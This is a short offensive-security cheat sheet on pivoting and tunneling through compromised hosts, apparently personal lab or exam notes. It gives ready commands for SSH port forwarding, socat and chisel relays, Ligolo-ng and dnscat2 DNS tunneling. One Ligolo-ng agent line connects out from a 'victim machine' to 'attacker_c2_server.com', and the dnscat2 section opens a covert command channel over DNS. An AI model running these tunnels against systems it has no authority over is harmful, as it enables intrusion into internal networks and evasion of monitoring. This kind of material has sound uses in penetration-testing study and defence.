https://juggernaut-sec.com/port-forwarding-lpe/

---
```sh
# Local port forwarding
ssh -N -L 0.0.0.0:8080:127.0.0.1:8080 juggernaut@172.16.1.150

# Dynamic port forwarding
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
## In /etc/proxychains4.conf (socks5 or socks4)
socks5 192.168.50.63 9999
## For port scanning, lower the tcp_read_time_out and tcp_connect_time_out values for fast scanning
## Prepend proxychains before any command to use it

# Remote port forwarding (Turn on SSH on kali & allow PasswordAuthentication)
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 root@192.168.118.4

# Remote Dynamic port forwarding
ssh -N -R 9998 root@192.168.118.4
```
# SSH Port Forwarding
Can't access `SSH` from LHOST, **port forward it!**

1) **Socat**
```sh
# RHOST
socat tcp-listen:6666,fork,reuseaddr tcp:localhost:3389
```

2) **Chisel**
```sh
# In local machine
chisel server -p 9999 --reverse

# In remote machine (assume we want to connect ssh://172.17.0.1:22)
chisel client <local-ip>:9999 R:2222:172.17.0.1:22
```

3) **Ligolo-ng**
```sh
# Setup
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up

# Run proxy server with self-signed certificate
./proxy -selfcert

# Transfer agent file to victim machine
./agent -connect attacker_c2_server.com:11601 -ignore-cert

# Select the session
ligolo-ng » session
? Specify a session : 1 - #1 - confluence@confluence01 - 192.168.215.63:35968

# Add a route (Type ip route on victim machine to get routes)
sudo ip route add 10.4.215.0/24 dev ligolo

# Start the tunneling
[Agent : confluence@confluence01] » start

# Now you can access the entire 10.4.215.0 network instead of just a single port
```


# DNS Tunneling
```sh
# On Kali Linux
dnscat2-server [your_registered_domain_name]

# On Target machine
./dnscat [your_registered_domain_name]

# List all active windows & select a window
dnscat2> windows
crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
  
dnscat2> window -i 1

# Port forwarding
listen 127.0.0.1:4455 172.16.2.11:445
```